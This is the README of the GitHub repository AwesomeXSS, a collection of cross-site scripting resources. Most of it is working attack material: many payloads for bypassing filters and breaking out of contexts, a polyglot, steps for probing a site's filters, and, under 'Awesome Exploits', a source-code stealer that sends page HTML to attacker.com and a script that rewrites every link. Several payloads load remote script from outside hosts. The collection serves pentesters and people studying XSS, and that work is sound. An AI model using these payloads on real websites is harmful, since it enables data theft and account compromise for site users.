# AwesomeXSS
This repository is a collection of Awesome XSS resources. Contributions are welcome and should be submitted via an issue.

### Donations
You can encourage me to create more such amazing programs buy donating a few bucks.

- Paypal - [https://paypal.me/s0md3v](https://paypal.me/s0md3v) or `somdevika@gmail.com`
- Credit/Debit Card - [https://www.buymeacoffee.com/s0md3v](https://www.buymeacoffee.com/s0md3v)

Do you want to sponsor the project and get mentioned here? Email me `s0md3v[at]gmail[dot]com`

### Awesome contents
- [Challenges](https://github.com/s0md3v/AwesomeXSS#awesome-challenges)
- [Reads & Presentations](https://github.com/s0md3v/AwesomeXSS#awesome-reads--presentations)
- [Tools](https://github.com/s0md3v/AwesomeXSS#awesome-tools)
- [Mind maps](https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps)
- [DOM XSS](https://github.com/s0md3v/AwesomeXSS#awesome-dom-xss)
- [Payloads](https://github.com/s0md3v/AwesomeXSS#awesome-payloads)
- [Polyglots](https://github.com/s0md3v/AwesomeXSS#awesome-polyglots)
- [Tags and event handlers](https://github.com/s0md3v/AwesomeXSS#awesome-tags--event-handlers)
- [Context breaking](https://github.com/s0md3v/AwesomeXSS#awesome-context-breaking)
    - [HTML context](https://github.com/s0md3v/AwesomeXSS#html-context)
    - [Attribute context](https://github.com/s0md3v/AwesomeXSS#attribute-context)
    - [JavaScript context](https://github.com/s0md3v/AwesomeXSS#javascript-context)
- [Confirm Variants](https://github.com/s0md3v/AwesomeXSS#awesome-confirm-variants)
- [Exploits](https://github.com/s0md3v/AwesomeXSS#awesome-exploits)
- [Probing](https://github.com/s0md3v/AwesomeXSS#awesome-probing)
- [Bypassing](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)
- [Encoding](https://github.com/s0md3v/AwesomeXSS#awesome-encoding)
- [Tips & tricks](https://github.com/s0md3v/AwesomeXSS#awesome-tips--tricks)

### Awesome Challenges
- [prompt.ml](https://prompt.ml)
- [alf.nu/alert1](https://alf.nu/alert1)
- [s-p-o-o-k-y.com](https://www.s-p-o-o-k-y.com)
- [xss-game.appspot.com](https://xss-game.appspot.com)
- [polyglot.innerht.ml](https://polyglot.innerht.ml)
- [sudo.co.il/xss](http://sudo.co.il/xss)
- [hack.me/t/XSS](https://hack.me/t/XSS)
- [root-me.org](https://www.root-me.org/?page=recherche&lang=en&recherche=xss)
- [chefsecure.com](https://chefsecure.com/courses/xss/challenges)
- [wechall.net](https://www.wechall.net/challs/XSS)

### Awesome Reads & Presentations
- [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
- [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
- [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
- [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
- [Copy Pest](https://www.slideshare.net/x00mario/copypest)

### Awesome Tools
- [XSStrike](https://github.com/UltimateHackers/XSStrike)
- [xsshunter.com](https://xsshunter.com)
- [BeEF](https://github.com/beefproject/beef)
- [JShell](https://github.com/UltimateHackers/JShell)

### Awesome XSS Mind Maps
A beautiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)

### Awesome DOM XSS

- Does your input go into a sink? `Vulnerable`
- It doesn't? `Not vulnerable`

**Source**: An input that could be controlled by an external (untrusted) source.

```
document.URL
document.documentURI
document.URLUnencoded (IE 5.5 or later Only)
document.baseURI
location
location.href
location.search
location.hash
location.pathname
document.cookie
document.referrer
window.name
history.pushState()
history.replaceState()
localStorage
sessionStorage
```

**Sink**: A potentially dangerous method that could lead to a vulnerability. In this case a DOM Based XSS.

```
eval
Function
setTimeout
setInterval
setImmediate
execScript
crypto.generateCRMFRequest
ScriptElement.src
ScriptElement.text
ScriptElement.textContent
ScriptElement.innerText
anyTag.onEventName
document.write
document.writeln
anyElement.innerHTML
Range.createContextualFragment
window.location
document.location
```

This comprehensive list of sinks and source is taken from [domxsswiki](https://github.com/wisec/domxsswiki).

### Awesome Payloads
```
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>
```

### Awesome Polyglots

Here's an XSS polyglot that I made which can break out of 20+ contexts:
```
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
```

Explanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/polyglot.png)

### Awesome Tags & Event Handlers
- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)

Some less detected event handlers
```
ontoggle
onauxclick
ondblclick
oncontextmenu
onmouseleave
ontouchcancel
```

Some HTML Tags that you will be using
```
img
svg
body
html
embed
script
object
details
isindex
iframe
audio
video
```

### Awesome Context Breaking

#### HTML Context
Case: `<tag>You searched for $input. </tag>`

```
<svg onload=alert()>
</tag><svg onload=alert()>
```

#### Attribute Context

Case: `<tag attribute="$input">`

```
"><svg onload=alert()>
"><svg onload=alert()><b attr="
" onmouseover=alert() "
"onmouseover=alert()//
"autofocus/onfocus="alert()
```
#### JavaScript Context

Case: `<script> var new something = '$input'; </script>`

```
'-alert()-'
'-alert()//'
'}alert(1);{'
'}%0Aalert(1);%0A{'
</script><svg onload=alert()>
```

### Awesome Confirm Variants
Yep, confirm because alert is too mainstream.
```
confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)
```

### Awesome Exploits
##### Replace all links
```javascript
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "https://attacker.com";
});
```
##### Source Code Stealer
```html
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
```
A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)

### Awesome Probing
If nothing of this works, take a look at **Awesome Bypassing** section

First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.
<br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
<br>For javascript context, check which quotes are being used for example if they are doing
```
variable = 'value' or variable = "value"
```
Now lets say single quotes (') are in use, in that case enter `x'd3v`. If it gets altered to `x\\'d3v`, try escaping the backslash (\) by adding a backslash to your probe i.e. `x\\'d3v`. If it works use the following payload:
```
\'-alert()//
```
But if it gets altered to `x\\\\'d3v`, the only thing you can try is closing the script tag itself by using
```
</script><svg onload=alert()>
```
For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potential filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
```
<svg onload=alert()//
```
or this (it will not work in all cases)
```
<svg onload=alert()
```
If the your dummy tags lands in the source code as it is, go for any of these payloads
```
<svg onload=alert()>
<embed src=//14.rs>
<details open ontoggle=alert()>
```

### Awesome Bypassing

**Note:** None of these payloads use single (') or double quotes (").

- Without event handlers
```
<object data=javascript:confirm()>
<a href=javascript:confirm()>click here
<script src=//14.rs></script>
<script>confirm()</script>
```
- Without space
```
<svg/onload=confirm()>
<iframe/src=javascript:alert(1)>
```
- Without slash (/)
```
<svg onload=confirm()>
<img src=x onerror=confirm()>
```
- Without equal sign (=)
```
<script>confirm()</script>
```
- Without closing angular bracket (>)
```
<svg onload=confirm()//
```
- Without alert, confirm, prompt
```
<script src=//14.rs></script>
<svg onload=co\u006efirm()>
<svg onload=z=co\u006efir\u006d,z()>
```
- Without a Valid HTML tag
```
<x onclick=confirm()>click here
<x ondrag=aconfirm()>drag it
```

- Bypass tag blacklisting
```
</ScRipT>
</script
</script/>
</script x>
```

### Awesome Encoding

|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
|----|----|-------|-----------|----|--------|----------|---|
|`&quot;`|"|`&#34;`|quotation mark|u+0022|\0022|\42|%22|
|`&num;`|#|`&#35;`|number sign|u+0023|\0023|\43|%23|
|`&dollar;`|$|`&#36;`|dollar sign|u+0024|\0024|\44|%24|
|`&percnt;`|%|`&#37;`|percent sign|u+0025|\0025|\45|%25|
|`&amp;`|`&|`&#38;`|ampersand|u+0026|\0026|\46|%26|
|`&apos;`|'|`&#39;`|apostrophe|u+0027|\0027|\47|%27|
|`&lpar;`|(|`&#40;`|left parenthesis|u+0028|\0028|\50|%28|
|`&rpar;`|)|`&#41;`|right parenthesis|u+0029|\0029|\51|%29|
|`&ast;`|*|`&#42;`|asterisk|u+002A|\002a|\52|%2A|
|`&plus;`|+|`&#43;`|plus sign|u+002B|\002b|\53|%2B|
|`&comma;`|,|`&#44;`|comma|u+002C|\002c|\54|%2C|
|`&minus;`|-|`&#45;`|hyphen-minus|u+002D|\002d|\55|%2D|
|`&period;`|.|`&#46;`|full stop; period|u+002E|\002e|\56|%2E|
|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\002f|\57|%2F|
|`&colon;`|:|`&#58;`|colon|u+003A|\003a|\72|%3A|
|`&semi;`|;`|`&#59;`|semicolon|u+003B|\003b|\73|%3B|
|`&lt;`|<|`&#60;`|less-than|u+003C|\003c|\74|%3C|
|`&equals;`|=|`&#61;`|equals|u+003D|\003d|\75|%3D|
|`&gt;`|>|`&#62;`|greater-than sign|u+003E|\003e|\76|%3E|
|`&quest;`|?|`&#63;`|question mark|u+003F|\003f|\77|%3F|
|`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\0040|\100|%40|
|`&lsqb;`|\[|`&#91;`|left square bracket|u+005B|\005b|\133|%5B|
|`&bsol;`|/|`&#92;`|backslash|u+005C|\005c|\134|%5C|
|`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\005d|\135|%5D|
|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136|%5E|
|`&lowbar;`|_|`&#95;`|low line|u+005F|\005f|\137|%5F|
|`&grave;`|\`|`&#96;`|grave accent|u+0060|\0060|\u0060|%60|
|`&lcub;`|{|`&#123;`|left curly bracket|u+007b|\007b|\173|%7b|
|`&verbar;`|\||`&#124;`|vertical bar|u+007c|\007c|\174|%7c|
|`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\007d|\175|%7d|

### Awesome Tips & Tricks
- `http(s)://` can be shortened to `//` or `/\\` or `\\`.
- `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
- alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
- You can use `//` to close a tag instead of `>`.
- I have found that `confirm` is the least detected pop-up function so stop using `alert`.
- Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
- The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)

### Awesome Credits
All the payloads are crafted by me unless specified.
